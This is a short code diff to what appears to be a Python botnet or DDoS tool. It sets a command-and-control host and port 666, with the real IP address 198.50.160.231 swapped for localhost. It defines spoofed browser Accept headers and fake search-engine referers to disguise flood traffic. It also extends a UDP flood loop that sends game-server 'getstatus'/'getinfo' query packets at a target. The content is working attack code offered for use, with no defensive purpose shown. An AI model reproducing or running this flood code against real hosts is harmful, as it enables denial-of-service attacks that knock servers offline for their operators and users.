@@ -26,7 +26,7 @@ from re import compile as compilee
 app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
 reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
 
-ipc2 = '198.50.160.231'
+ipc2 = 'localhost'
 portc2 = 666
 
 def strm(siz):
@@ -772,7 +772,8 @@ def main():
                     try:
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
-                            payl = b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73'
+                            payl = (b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73'
+                                    b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00')
                             s.sendto(payl , (ip_tt , port))
                     except:
                         pass
